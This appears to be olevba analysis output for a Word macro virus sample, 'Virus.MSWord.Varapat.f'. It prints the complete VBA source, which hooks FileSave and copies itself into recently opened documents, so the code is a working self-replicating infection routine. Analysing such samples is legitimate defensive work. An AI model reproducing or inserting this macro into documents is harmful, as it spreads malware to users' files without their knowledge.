olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Varapat.f-0730b0182802b2ddd01f74e3144d661d2982378e
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Varapat.f-0730b0182802b2ddd01f74e3144d661d2982378e 
in file: Virus.MSWord.Varapat.f-0730b0182802b2ddd01f74e3144d661d2982378e - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
On Error Resume Next
For s = 2 To 9
Application.OrganizerCopy ActiveDocument.FullName, _
RecentFiles(s).Path & "\" & RecentFiles(s).Name, "N", 3
Next s
End Sub
Sub FileSave()
ToolsMacro
End Sub
'Nitema II, Pativara/Nestor, 2005'

No suspicious keyword or IOC found.

